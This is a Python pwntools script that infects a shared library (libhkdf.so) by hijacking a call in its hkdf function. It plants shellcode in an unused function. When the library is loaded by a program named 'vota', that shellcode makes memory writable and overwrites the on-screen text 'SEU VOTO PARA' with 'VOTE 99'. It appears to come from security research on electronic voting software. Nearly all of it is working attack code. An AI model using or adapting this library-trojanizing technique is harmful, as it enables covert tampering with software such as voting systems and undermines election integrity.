#!/usr/bin/python2
# -*- encoding: utf-8 -*-

import re
from pwn import *
context(arch='i386')


def load_addr(addr, data):
    code = 'mov edi, 0x%x\n' % addr
    while data != '':
        if len(data) >= 4:
            code += 'mov eax, 0x%x\nstosd\n' % u32(data[:4])
            data = data[4:]
        elif len(data) >= 2:
            code += 'mov ax, 0x%x\nstosw\n' % u16(data[:2])
            data = data[2:]
        elif len(data) == 1:
            code += 'mov al, 0x%x\nstosb\n' % u8(data[:1])
            data = data[1:]
        else:
            raise ValueError('should never be reached')
    return code


hkdf = ELF('../libhkdf.so.orig')
vota = ELF('vota')


thunk = hkdf.symbols['__x86.get_pc_thunk.ax']
hkdf_begin = hkdf.symbols['_Z4hkdfPKhPh']
# Look for address of the instruction just after
# "call __x86.get_pc_thunk.ax" inside
# the _Z4hkdfPKhPh function
hkdf_address = int('0x' +
    re.search(r'call\s+0x%x\n\s*([^:]+)' % thunk,
              disasm(hkdf.read(hkdf_begin, 32),
                     vma=hkdf_begin,
                     byte=False)
             ).group(1)
    , 16)

unused_code_address = hkdf.symbols['_Z4lixov']
unused_code_diff = unused_code_address - hkdf_address


infect_hkdf_asm = (
    """
    add eax, 0x%x
    call eax
    """ % unused_code_diff)
infect_hkdf = asm(infect_hkdf_asm)

hkdf_original_asm = disasm(hkdf.read(hkdf_address, len(infect_hkdf)),
                           byte=False,
                           offset=False)
hkdf_original = asm(hkdf_original_asm)

assert len(infect_hkdf) == len(hkdf_original), \
    "The size of the infected code must be the same as the size of the original one which is being replaced"

log.info("Infecting hkdf")
log.info("%s ==> %s" % (hkdf_original_asm, infect_hkdf_asm))
hkdf.write(hkdf_address, infect_hkdf)

vota_addr = vota.search('SEU VOTO PARA').next()
vota_replace = 'VOTE 99\x00'

expected_contents = u32(vota.read(vota_addr, 4))
overwrite_unused_code_asm = (
    """
    pushad
    // verify whether the lib is loaded inside VOTA
    mov eax, 0x%x
    mov eax, [eax]
    cmp eax, 0x%x
    jne its_not_vota
    """ % (vota_addr, expected_contents) +
    shellcraft.mprotect(vota_addr & (~4095), 2*4096, 7) +
    load_addr(vota_addr, vota_replace) +
    """
    its_not_vota:
    popad
    sub eax, 0x%x
    """ % unused_code_diff +
    hkdf_original_asm +
    """
    ret
    """)
overwrite_unused_code = asm(overwrite_unused_code_asm)

log.info("Overwriting unused code with code to plant the string modification routine")
log.info(overwrite_unused_code_asm)
hkdf.write(unused_code_address, overwrite_unused_code)

hkdf.save('../libhkdf.so')
